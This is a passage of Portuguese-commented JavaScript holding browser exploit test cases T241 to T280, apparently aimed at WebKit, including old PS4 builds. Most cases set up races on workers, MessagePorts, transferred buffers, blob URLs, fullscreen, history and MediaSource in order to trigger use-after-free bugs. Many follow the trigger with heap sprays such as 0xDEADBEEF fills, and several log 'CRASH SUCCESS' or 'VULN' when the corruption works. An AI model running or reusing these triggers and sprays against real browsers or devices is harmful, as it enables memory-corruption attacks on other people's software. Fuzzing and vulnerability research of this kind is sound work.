        // Realoca para o próximo ciclo
        ab = new ArrayBuffer(1024 * 1024 * 8);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T241: Transfer race finished.");
    }, 3000);
}

function runTest242() {
    log("Iniciando T242: Shared Array Buffer Atomic Tear...");
    // Simulação de race condition em TypedArrays compartilhados via IPC
    var sab = new ArrayBuffer(1024);
    var i32 = new Int32Array(sab);
    
    var code = "self.onmessage=function(e){var v=new Int32Array(e.data); v[0]=0x12345678;}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        // Envia buffer (cópia ou transfer)
        w.postMessage(sab);
        
        // Modifica localmente simultaneamente
        i32[0] = 0xFFFFFFFF;
        
        // Tenta confundir o tipo de array view
        try {
            var f32 = new Float32Array(sab);
            f32[0] = 1.5;
        } catch(e){}
        
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T242: Buffer tearing stop.");
    }, 3000);
}

function runTest243() {
    log("Iniciando T243: Message Port Transfer Flood UAF...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    var code = "self.onmessage=function(e){if(e.data.close) e.data.close();}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        try {
            // Cria canais descartáveis
            var temp = new MessageChannel();
            // Transfere porta 1 para o worker
            w.postMessage(temp.port1, [temp.port1]);
            // Fecha porta 2 localmente
            temp.port2.close();
            
            // Força GC na main thread
            var junk = new Array(1000).fill({});
        } catch(e) {}
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T243: Port flooding done.");
    }, 3000);
}

function runTest244() {
    log("Iniciando T244: Blob URL Revocation Thread Race...");
    var data = new Uint8Array(1024*1024).fill(0xCC);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var code = "self.onmessage=function(u){var x=new XMLHttpRequest(); x.open('GET',u,false); try{x.send();}catch(e){}}";
    var wb = new Blob([code], {type:'js'});
    
    var workers = [];
    for(var i=0; i<12; i++) workers.push(new Worker(URL.createObjectURL(wb)));
    
    var t = setInterval(function() {
        // Manda todos os workers lerem
        workers.forEach(w => w.postMessage(url));
        
        // Revoga URL imediatamente
        URL.revokeObjectURL(url);
        
        // Recria para manter o loop
        url = URL.createObjectURL(new Blob([data]));
    }, 15);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T244: URL race stopped.");
    }, 3000);
}

function runTest245() {
    log("Iniciando T245: Nested Worker Close Chain Reaction...");
    var innerCode = "self.onmessage=function(e){setInterval(()=>{postMessage(new Uint8Array(1024*1024));},10);}";
    var innerBlob = new Blob([innerCode], {type:'js'});
    var innerURL = URL.createObjectURL(innerBlob);
    
    var outerCode = `
        var w = new Worker('${innerURL}');
        w.onmessage = function(e) { postMessage(e.data); } // Relay
        self.onmessage = function(e) { if(e.data=='kill') w.terminate(); }
    `;
    var outerBlob = new Blob([outerCode], {type:'js'});
    
    var w = new Worker(URL.createObjectURL(outerBlob));
    
    w.onmessage = function(e) {
        // Recebeu dados do inner worker via relay
        // Mata o outer worker, deixando o inner worker órfão enviando mensagens
        w.terminate();
        
        // Spray imediato para pegar heap liberado pelo outer worker
        var spray = new Uint32Array(1024*1024).fill(0xDEADBEEF);
        
        // Reinicia
        w = new Worker(URL.createObjectURL(outerBlob));
    };
    
    setTimeout(function() {
        w.terminate();
        log(">> T245: Worker chain reaction test.");
    }, 3000);
}

function runTest246() {
    log("Iniciando T246: Fullscreen Video Src Swap Panic...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var t = setInterval(function() {
        // Troca o src para um Blob que é revogado imediatamente
        var b = new Blob(["junk"], {type:'video/mp4'});
        var u = URL.createObjectURL(b);
        v.src = u;
        URL.revokeObjectURL(u);
        
        // Força reload enquanto em FS
        v.load();
        
        // Toggle display para forçar compositor a descartar/recriar surface
        v.style.display = "none";
        v.offsetHeight; // force layout
        v.style.display = "block";
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T246: Video surface panic stop.");
    }, 3000);
}

function runTest247() {
    log("Iniciando T247: History State Getter GC Trigger...");
    var pressure = [];
    
    var poison = {
        get val() {
            // Getter executado durante serialização do History
            // Aloca memória massiva para forçar GC
            pressure = new Array(10000).fill("STRING_PRESSURE");
            // Tenta corromper o histórico durante o push
            history.replaceState(null, null, "/corrupt");
            return 1;
        }
    };
    
    var t = setInterval(function() {
        try {
            history.pushState(poison, "Poison", "/poison");
            history.back();
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T247: History serializer poison done.");
    }, 3000);
}

function runTest248() {
    log("Iniciando T248: Iframe Nav Fullscreen Lockout...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var el = d.createElement('div');
        el.style.background = "red";
        d.body.appendChild(el);
        
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        
        setTimeout(function() {
            // Remove iframe do DOM enquanto ele detém o FS
            document.body.removeChild(f);
            
            // Tenta pedir FS no documento pai imediatamente
            reqFS(document.body);
            
            // Spray de memória para corromper a estrutura de janela antiga
            var spray = new Uint32Array(0x4000).fill(0x13371337);
        }, 100);
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T248: Iframe FS lockout attempt.");
    }, 3000);
}

function runTest249() {
    log("Iniciando T249: Canvas Context Loss Resize Loop...");
    var c = document.createElement('canvas');
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Redimensionamento drástico em FS
        c.width = Math.random() > 0.5 ? 4096 : 10;
        c.height = Math.random() > 0.5 ? 2160 : 10;
        
        // Desenha algo
        ctx.fillStyle = "blue";
        ctx.fillRect(0,0,c.width, c.height);
        
        // Tenta perder contexto
        var ext = ctx.getExtension('WEBGL_lose_context');
        if(ext) ext.loseContext();
        
        // Heap pressure
        var junk = ctx.getImageData(0,0,1,1);
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T249: Canvas FS resize stress.");
    }, 3000);
}

function runTest250() {
    log("Iniciando T250: THE SINGULARITY (ALL-IN-ONE)...");
    
    // 1. Worker transfer loop
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen toggle
    var el = document.createElement('div');
    el.style.background = "green";
    document.body.appendChild(el);
    var fsInt = setInterval(() => {
        if(Math.random()>0.5) reqFS(el); else exitFS();
    }, 150);
    
    // 3. History Push
    var hInt = setInterval(() => {
        try { history.pushState({data: new Array(100).fill(1)}, "x", "/"+Date.now()); } catch(e){}
    }, 80);
    
    // 4. Memory Alloc
    var memInt = setInterval(() => {
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
    }, 20);

    setTimeout(function() {
        clearInterval(fsInt);
        clearInterval(hInt);
        clearInterval(memInt);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T250: Singularity event collapse.");
    }, 5000);
}
function runTest251() {
    log("Iniciando T251: Worker Port Transfer Terminate Race...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    var b = new Blob(["self.onmessage=function(e){var p=e.data; p.postMessage('ack'); self.close();}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        // Envia porta para worker e mata worker imediatamente
        // O Kernel tenta entregar a mensagem para uma thread morrendo
        try {
            w.postMessage(p2, [p2]);
            w.terminate();
            // Tenta usar a porta local que estava entrelaçada
            p1.postMessage("crash");
        } catch(e) {}
        
        // Reset
        w = new Worker(URL.createObjectURL(b));
        mc = new MessageChannel();
        p1 = mc.port1;
        p2 = mc.port2;
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T251: Port race finished.");
    }, 2000);
}

function runTest252() {
    log("Iniciando T252: TypedArray View Detach Write...");
    var ab = new ArrayBuffer(1024 * 1024);
    var view = new DataView(ab);
    var b = new Blob(["self.onmessage=function(e){postMessage('done');}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    // Tenta escrever em memória após transferir a posse (Neutering)
    try {
        w.postMessage(ab, [ab]);
        // Acesso ilegal imediato
        for(var i=0; i<100; i++) {
            view.setUint8(i, 0xFF);
        }
        log("!! T252: Wrote to neutered buffer (CRASH SUCCESS if happened)");
    } catch(e) {
        log(">> T252 Blocked: " + e.message);
    }
    
    // Heap spray para preencher o buffer liberado se o write passar
    var spray = new Uint8Array(1024*1024).fill(0xCC);
}

function runTest253() {
    log("Iniciando T253: Blob URL Revoke During XHR Fetch...");
    var data = new Uint8Array(1024*1024*5).fill(0x41); // 5MB
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.responseType = "arraybuffer";
    
    xhr.onreadystatechange = function() {
        if(xhr.readyState === 2 || xhr.readyState === 3) {
            // Revoga a URL enquanto o download está em progresso
            // Tenta causar UAF no recurso de blob do kernel
            URL.revokeObjectURL(url);
            // Destrói referência JS
            blob = null; 
            // Força GC
            var junk = new Array(10000).fill({});
        }
    };
    
    xhr.send();
    log(">> T253: XHR vs Revoke race started.");
}

function runTest254() {
    log("Iniciando T254: Worker Import Recursive Stack Smash...");
    // Cria uma cadeia de imports circular que se auto-destrói
    var b1 = new Blob(["try{importScripts(self.location.href);}catch(e){}"], {type:'js'});
    var url = URL.createObjectURL(b1);
    
    var workers = [];
    for(var i=0; i<50; i++) {
        var w = new Worker(url);
        workers.push(w);
    }
    
    setTimeout(function() {
        // Mata todos simultaneamente para estressar o cleanup de stack do kernel
        workers.forEach(w => w.terminate());
        URL.revokeObjectURL(url);
        log(">> T254: Recursion stack termination.");
    }, 1000);
}

function runTest255() {
    log("Iniciando T255: Message Channel Port Closure UAF...");
    var ch = new MessageChannel();
    var p1 = ch.port1;
    
    p1.onmessage = function(e) {
        // Fecha a porta dentro do seu próprio callback
        p1.close();
        // Tenta postar mensagem na porta fechada imediatamente
        // Alguns motores antigos tentavam acessar a estrutura interna deletada
        try {
            p1.postMessage("afterlife");
        } catch(z) {}
    };
    
    // Trigger
    ch.port2.postMessage("kill");
    
    // Spray
    var arr = new Array(1000).fill(1.1);
    log(">> T255: Port self-close test.");
}

function runTest256() {
    log("Iniciando T256: Fullscreen Element Removal Trap...");
    var el = document.createElement('div');
    el.style.backgroundColor = "red";
    document.body.appendChild(el);
    reqFS(el);
    
    setTimeout(function() {
        // Remove o elemento do DOM enquanto ele é o root do Fullscreen
        if(el.parentNode) el.parentNode.removeChild(el);
        
        // Tenta navegar para forçar o browser a lidar com o elemento fantasma
        history.pushState({}, "t", "/ghost_fs");
        
        // Sai do FS (Kernel tenta restaurar janela para null)
        exitFS();
        
        // Corrompe referência JS
        el = null;
        var spray = new Uint32Array(0x1000).fill(0xDEADBEEF);
        
        log(">> T256: Ghost element FS exit.");
    }, 500);
}

function runTest257() {
    log("Iniciando T257: History State Object Getter Poison...");
    var poison = {
        get a() {
            // Getter destrutivo executado durante o restore do history
            history.replaceState(null, null, "/cleared");
            var junk = new Float64Array(10000); // Pressão de memória
            return 1;
        }
    };
    
    // Empilha estado venenoso
    history.pushState(poison, "P", "/p");
    
    // Navega para longe e volta
    // O motor tenta ler 'a' para restaurar o objeto, disparando o getter
    history.pushState({}, "Safe", "/safe");
    setTimeout(function() {
        history.back();
        log(">> T257: Poisoned state access triggered.");
    }, 200);
}

function runTest258() {
    log("Iniciando T258: Canvas Pattern Source Mutation...");
    var src = document.createElement('canvas');
    src.width = 100; src.height = 100;
    var sCtx = src.getContext('2d');
    sCtx.fillStyle = "red"; sCtx.fillRect(0,0,100,100);
    
    var dst = document.createElement('canvas');
    dst.width = 1000; dst.height = 1000;
    document.body.appendChild(dst);
    var dCtx = dst.getContext('2d');
    
    // Cria padrão baseado no canvas fonte
    var ptrn = dCtx.createPattern(src, 'repeat');
    
    var t = setInterval(function() {
        dCtx.fillStyle = ptrn;
        
        // Enquanto o padrão está sendo usado para preencher...
        // ...redimensionamos a fonte para 0, invalidando o buffer subjacente
        src.width = 0;
        
        dCtx.fillRect(0,0,1000,1000);
        
        // Restaura
        src.width = 100;
        sCtx.fillStyle = "red"; sCtx.fillRect(0,0,100,100);
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        document.body.removeChild(dst);
        log(">> T258: Pattern source UAF attempts done.");
    }, 2000);
}

function runTest259() {
    log("Iniciando T259: Iframe Doc Open History Nav...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        // Abre o documento (limpa estado)
        d.open();
        d.write("<h1>Test</h1>");
        
        // Enquanto o documento está aberto/escrevendo, força navegação via history
        f.contentWindow.history.pushState({}, "x", "/x");
        
        // Fecha documento
        d.close();
        
        // Tenta voltar imediatamente
        // Conflito entre o parser de documento e o gerenciador de sessão
        setTimeout(() => f.contentWindow.history.back(), 0);
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T259: DocLoader history race.");
    }, 2000);
}

function runTest260() {
    log("Iniciando T260: Media Source Buffer Append Abort...");
    if(!window.MediaSource) { log(">> T260: MediaSource API missing."); return; }
    
    var ms = new MediaSource();
    var v = document.createElement('video');
    v.src = URL.createObjectURL(ms);
    
    ms.addEventListener('sourceopen', function() {
        try {
            var sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
            var buf = new Uint8Array(1024*1024).fill(0); // Dados falsos
            
            // Inicia append
            sb.appendBuffer(buf);
            
            // Aborta imediatamente e remove o SourceBuffer
            // Race condition no gerenciador de buffer de mídia
            sb.abort();
            ms.removeSourceBuffer(sb);
            
            // Fecha MediaSource
            ms.endOfStream();
        } catch(e) {}
    });
    
    setTimeout(function() {
        v.src = "";
        log(">> T260: Media buffer abort sequence.");
    }, 2000);
}
function runTest261() {
    log("Iniciando T261: Worker Port Transfer Terminate Race...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    
    // Worker que tenta usar a porta imediatamente
    var b = new Blob(["self.onmessage=function(e){e.data.postMessage('ping'); self.close();}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        try {
            // Transfere a porta e mata o worker na mesma fatia de tempo
            // O Kernel pode tentar entregar a mensagem para um handle inválido
            w.postMessage(p2, [p2]);
            w.terminate();
            
            // Tenta enviar mensagem na porta local que estava conectada
            p1.postMessage("crash");
        } catch(e) {}
        
        // Reconecta para o próximo ciclo
        mc = new MessageChannel();
        p1 = mc.port1;
        p2 = mc.port2;
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T261: Port race finished.");
    }, 2500);
}

function runTest262() {
    log("Iniciando T262: TypedArray Neuter View Access...");
    var ab = new ArrayBuffer(1024 * 1024);
    var u8 = new Uint8Array(ab);
    u8[0] = 0xAA;
    
    var b = new Blob(["self.onmessage=function(e){postMessage('done');}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    try {
        // Transfere o buffer (Neutering)
        w.postMessage(ab, [ab]);
        
        // Tenta acessar a view antiga imediatamente
        // Se a implementação de neutering não for atômica, isso lê memória liberada
        var val = u8[0];
        
        // Tenta redefinir propriedades no buffer neuterizado
        Object.defineProperty(ab, "byteLength", {value: 100});
        
        if(val === 0xAA) log("!! T262: Read neutered buffer success (VULN)");
    } catch(e) {
        log(">> T262 Access Blocked: " + e.message);
    }
    
    // Heap Spray para preencher o local do buffer se houve UAF
    var spray = new Uint8Array(1024*1024).fill(0xCC);
}

function runTest263() {
    log("Iniciando T263: Blob URL Revoke Fetch Race...");
    var data = new Uint8Array(1024 * 512).fill(0x41);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.responseType = "arraybuffer";
        
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 1) { // OPENED
                // Revoga URL antes do send completar/iniciar download
                URL.revokeObjectURL(url);
                // Sobrescreve blob original
                blob = null;
                // Spray pequeno para metadados de URL
                var junk = {a: 1, b: 2, c: 3};
            }
        };
        xhr.send();
        
        // Prepara próxima iteração
        url = URL.createObjectURL(new Blob([data]));
    }, 15);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T263: URL Fetch Race stopped.");
    }, 2500);
}

function runTest264() {
    log("Iniciando T264: Nested Worker Orphan Message...");
    var codeInner = "self.onmessage=function(e){setInterval(()=>postMessage('flood'), 1);}";
    var urlInner = URL.createObjectURL(new Blob([codeInner], {type:'js'}));
    
    var codeOuter = `var w=new Worker('${urlInner}'); self.onmessage=function(e){w.postMessage('start'); self.close();}`;
    var urlOuter = URL.createObjectURL(new Blob([codeOuter], {type:'js'}));
    
    var w = new Worker(urlOuter);
    w.postMessage("init");
    
    // O Worker Outer inicia o Inner e se fecha.
    // O Inner continua rodando e tentando enviar mensagens para o Outer morto?
    // Ou o Outer tenta repassar mensagens para a Main Thread enquanto morre?
    
    setTimeout(function() {
        w.terminate();
        var spray = new Float64Array(10000).fill(1.234);
        log(">> T264: Orphan worker check done.");
    }, 2000);
}

function runTest265() {
    log("Iniciando T265: Message Channel Close UAF...");
    var ch = new MessageChannel();
    var p1 = ch.port1;
    
    // Setup de callback que fecha a própria porta
    p1.onmessage = function(e) {
        p1.close();
        p1.onmessage = null;
        // Tenta acessar propriedades internas após fechar
        try { var x = p1.start; } catch(z){}
        // Tenta enviar mensagem na porta morta
        try { p1.postMessage("ghost"); } catch(z){}
    };
    
    // Gatilho
    ch.port2.postMessage("trigger");
    
    // Spray de objetos de tamanho similar a MessagePort (ex: 0x40 - 0x80 bytes)
    var arr = [];
    for(var i=0; i<1000; i++) arr.push({p: 1, q: 2, r: 3, s: 4});
    
    log(">> T265: Port self-close logic executed.");
}

function runTest266() {
    log("Iniciando T266: DOM Node Removed Re-Append Trap...");
    var el = document.createElement('div');
    var child = document.createElement('span');
    el.appendChild(child);
    document.body.appendChild(el);
    
    // Evento de mutação síncrono (comum em WebKits antigos do PS4)
    el.addEventListener('DOMNodeRemoved', function(e) {
        if(e.target === child) {
            // Tenta readicionar o nodo que está sendo removido
            // Isso confunde o gerenciamento de estado da árvore DOM
            try {
                document.body.appendChild(child);
                child.innerHTML = "ZOMBIE";
            } catch(z) {}
            
            // Spray para sobrescrever memória se o nodo foi liberado prematuramente
            var spray = new Uint32Array(100).fill(0x11223344);
        }
    });
    
    // Dispara remoção
    try {
        el.removeChild(child);
    } catch(e) {}
    
    setTimeout(function() {
        if(document.body.contains(el)) document.body.removeChild(el);
        if(document.body.contains(child)) document.body.removeChild(child);
        log(">> T266: Mutation event trap executed.");
    }, 1000);
}

function runTest267() {
    log("Iniciando T267: History State Getter Reallocation...");
    var bomb = {};
    Object.defineProperty(bomb, 'prop', {
        get: function() {
            // Executado durante serialize do history.pushState
            // Aloca muita memória para forçar movimento no heap
            var tmp = new Array(5000).fill("JUNK");
            // Tenta modificar o histórico recursivamente
            history.replaceState(null, null, "cleaned");
            return "value";
        },
        enumerable: true
    });
    
    try {
        history.pushState(bomb, "Bomb", "/bomb");
    } catch(e) {
        log(">> T267 Serialization: " + e.message);
    }
}

function runTest268() {
    log("Iniciando T268: Fullscreen Iframe Detach Panic...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var div = d.createElement('div');
        div.style.backgroundColor = "green";
        d.body.appendChild(div);
        
        if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
        
        setTimeout(function() {
            // Remove o iframe do documento principal enquanto ele tem um elemento em FS
            document.body.removeChild(f);
            
            // Tenta acessar o elemento órfão
            div.innerHTML = "ORPHAN";
            
            // Força exitFS globalmente (Kernel tenta restaurar foco para janela inexistente)
            exitFS();
            
            // Spray de memória de vídeo/janela (buffers grandes)
            var vramSpray = new Uint32Array(1024 * 1024).fill(0xDEADBEEF);
        }, 100);
    };
    f.src = "about:blank";
    
    log(">> T268: Iframe detach scheduled.");
}

function runTest269() {
    log("Iniciando T269: Canvas Resize Draw Lock...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    var t = setInterval(function() {
        // Inicia um path complexo
        ctx.beginPath();
        for(var i=0; i<100; i++) ctx.lineTo(Math.random()*1000, Math.random()*1000);
        
        // Redimensiona o canvas (limpa buffer) NO MEIO da operação de desenho lógico
        if(Math.random() > 0.5) c.width = 1000;
        
        // Tenta preencher o path no buffer (potencialmente) inválido
        ctx.fill();
        
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        document.body.removeChild(c);
        log(">> T269: Canvas resize race stopped.");
    }, 2500);
}

function runTest270() {
    log("Iniciando T270: Media Source Buffer Abort Race...");
    if(!window.MediaSource) { log(">> T270: API Missing"); return; }
    
    var ms = new MediaSource();
    var v = document.createElement('video');
    v.src = URL.createObjectURL(ms);
    
    ms.addEventListener('sourceopen', function() {
        try {
            var sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
            
            // Cria buffer falso
            var buf = new Uint8Array(1024 * 1024);
            
            // Append
            sb.appendBuffer(buf);
            
            // Abort imediato e remoção
            sb.abort();
            ms.removeSourceBuffer(sb);
            
            // Tenta acessar buffer removido
            sb.timestampOffset = 10;
        } catch(e) {}
    });
    
    setTimeout(function() {
        v.removeAttribute('src');
        log(">> T270: MediaSource logic executed.");
    }, 2000);
}
function runTest271() {
    log("Iniciando T271: Worker Blob URL Sync XHR Race...");
    var code = "self.onmessage=function(e){var b=new Blob([new Array(1024*1024).join('A')]); postMessage(URL.createObjectURL(b));}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    w.onmessage = function(e) {
        var url = e.data;
        var xhr = new XMLHttpRequest();
        // XHR Síncrono trava a thread
        xhr.open("GET", url, false);
        
        // Agenda a destruição do worker e revogação da URL para "durante" o request se possível
        setTimeout(function() {
            w.terminate();
            URL.revokeObjectURL(url);
            // Heap spray para corromper o buffer de leitura do XHR
            var spray = new Uint8Array(1024*1024).fill(0xCC);
        }, 0);
        
        try { xhr.send(); } catch(z) {}
        log(">> T271: Sync XHR finished (Surived?).");
    };
    w.postMessage("go");
}

function runTest272() {
    log("Iniciando T272: TypedArray Neuter Recursive Transfer...");
    var ab = new ArrayBuffer(1024);
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){try{postMessage(e.data,[e.data]);}catch(z){}}"], {type:'js'})));
    
    w.onmessage = function(e) {
        var back = e.data;
        if(back.byteLength > 0) {
            // Transfere de volta recursivamente
            // Tenta criar uma condição onde o buffer é neuterizado (transferido) 
            // mas o ponteiro interno ainda é acessado pelo GC
            var junk = {buf: back, ref: back}; 
            w.postMessage(back, [back]);
            
            // Alocação rápida para tentar pegar o slot
            var fill = new Uint8Array(1024).fill(0xAA);
        }
    };
    
    // Inicia ping-pong
    w.postMessage(ab, [ab]);
    
    setTimeout(() => { w.terminate(); log(">> T272: Ping-pong stop."); }, 2000);
}

function runTest273() {
    log("Iniciando T273: Message Channel Port Garbage Trap...");
    var ch = new MessageChannel();
    var p1 = ch.port1;
    
    // Cria um objeto complexo segurando a porta
    var complex = { 
        port: p1, 
        buffer: new ArrayBuffer(0x10000),
        large: "S".repeat(10000)
    };
    
    // Envia para si mesmo
    window.postMessage(complex, "*", [p1]);
    
    // Imediatamente tenta fechar e destruir a referência
    // O kernel tem a porta "em voo" (in-flight), mas o JS tenta invalidá-la
    try {
        complex.port.close(); // Já deve estar neutered, mas testamos a race
        complex = null;
    } catch(e) {}
    
    // GC Forçado (simulado)
    var spray = [];
    for(var i=0; i<10000; i++) spray.push(new Uint8Array(32));
    
    log(">> T273: Port in-flight GC trap.");
}

function runTest274() {
    log("Iniciando T274: Import Scripts Network Abort...");
    // Worker tenta importar script que demora/falha
    var slowURL = "/?delay=1000&junk=" + Math.random(); 
    var code = `try { importScripts('${slowURL}'); } catch(e) {}`;
    var blob = new Blob([code], {type:'js'});
    
    var workers = [];
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(blob));
        workers.push(w);
        
        // Mata o worker enquanto ele está com conexão de rede aberta (importScripts bloqueante)
        // Tenta corromper o estado do stack de rede do kernel
        if(workers.length > 5) {
            var dead = workers.shift();
            dead.terminate();
        }
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T274: Network abort race done.");
    }, 3000);
}

function runTest275() {
    log("Iniciando T275: Worker Terminate Shared Array Mock...");
    // Simula race com arrays "compartilhados" via cópia rápida
    var ab = new ArrayBuffer(1024*1024);
    var view = new Int32Array(ab);
    view[0] = 0x1234;
    
    var code = "self.onmessage=function(e){var v=new Int32Array(e.data); v[0]=0xFFFF; while(1);}";
    var blob = new Blob([code], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(blob));
        // Envia buffer (cópia)
        w.postMessage(ab);
        
        // Modifica localmente
        view[0] = Math.random() * 0xFFFFFFFF;
        
        // Mata worker imediatamente
        w.terminate();
        
        // Tenta pegar lixo
        var check = new Int32Array(new ArrayBuffer(1024*1024));
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T275: Memory churn finished.");
    }, 3000);
}

function runTest276() {
    log("Iniciando T276: Range Extract DOM Removal UAF...");
    var div = document.createElement('div');
    div.innerHTML = "<b>Start</b><span>Middle</span><i>End</i>";
    document.body.appendChild(div);
    
    var r = document.createRange();
    r.selectNodeContents(div);
    
    // Callback que muta o DOM durante a operação de range
    div.addEventListener('DOMNodeRemoved', function(e) {
        if(e.target.tagName === 'SPAN') {
            // Remove o 'i' enquanto o 'span' está sendo processado
            div.innerHTML = ""; 
            // Spray de memória no heap DOM (tamanho ~0x40)
            var spray = [];
            for(var i=0; i<100; i++) spray.push(document.createTextNode("AAAA"));
        }
    });
    
    try {
        // extractContents dispara eventos de mutação
        var frag = r.extractContents();
    } catch(e) {
        log(">> T276 Error: " + e.message);
    }
    
    document.body.removeChild(div);
}

function runTest277() {
    log("Iniciando T277: Fullscreen Iframe History Nav Back...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var el = d.createElement('div');
        el.style.background = "red";
        d.body.appendChild(el);
        
        // 1. FS no Iframe
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        
        // 2. Push state no Iframe
        f.contentWindow.history.pushState({}, "state", "/fs");
        
        setTimeout(function() {
            // 3. Iframe navega de volta
            f.contentWindow.history.back();
            
            // 4. Pai remove Iframe imediatamente
            document.body.removeChild(f);
            
            // 5. Pai pede FS (conflito de compositor)
            reqFS(document.body);
            
            // 6. Spray
            var x = new Uint32Array(0x10000).fill(0xDEAD);
        }, 200);
    };
    f.src = "about:blank";
    
    log(">> T277: FS History Nav sequence started.");
}

function runTest278() {
    log("Iniciando T278: SVG Pattern Canvas Paint Loop...");
    var c = document.createElement('canvas');
    c.width=500; c.height=500;
    var ctx = c.getContext('2d');
    
    // Imagem SVG que contem script (se permitido) ou animação SMIL
    var svg = '<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">' +
              '<circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />' +
              '<animate attributeName="cx" from="50" to="150" dur="1s" repeatCount="indefinite" />' +
              '</svg>';
    var img = new Image();
    img.src = "data:image/svg+xml;base64," + btoa(svg);
    
    img.onload = function() {
        var ptrn = ctx.createPattern(img, 'repeat');
        var t = setInterval(function() {
            ctx.fillStyle = ptrn;
            ctx.fillRect(0,0,500,500);
            
            // Invalida a imagem fonte forçando reload
            img.src = "data:image/svg+xml;base64," + btoa(svg.replace("yellow", "red"));
            
            // Spray de textura
            var dat = ctx.createImageData(100,100);
        }, 50);
        
        setTimeout(() => clearInterval(t), 2000);
    };
    log(">> T278: SVG Pattern cycle.");
}

function runTest279() {
    log("Iniciando T279: XSLT Processor Doc Fragment Mutation...");
    if(!window.XSLTProcessor) { log(">> T279: XSLT N/A"); return; }
    
    var xml = new DOMParser().parseFromString("<root><a>1</a><a>2</a></root>", "text/xml");
    var xsl = new DOMParser().parseFromString(`
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:for-each select="//a">
                <div id="target"><xsl:value-of select="."/></div>
            </xsl:for-each>
        </xsl:template>
        </xsl:stylesheet>`, "text/xml");
        
    var p = new XSLTProcessor();
    p.importStylesheet(xsl);
    
    // Tenta modificar o documento fonte DURANTE a transformação?
    // Difícil sincronizar, mas podemos tentar race com getters
    try {
        var f = p.transformToFragment(xml, document);
        var div = f.querySelector("#target");
        // UAF potencial se o fragmento referenciava nós do XML original que foram liberados
        xml = null;
        var s = div.textContent;
    } catch(e) {}
    
    log(">> T279: XSLT logic executed.");
}

function runTest280() {
    log("Iniciando T280: OMEGA CLUSTER: THE REAPING...");
    // Combina: Worker Transfer, History Nav, Fullscreen Exit, GC
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    var el = document.createElement('div');
    document.body.appendChild(el);
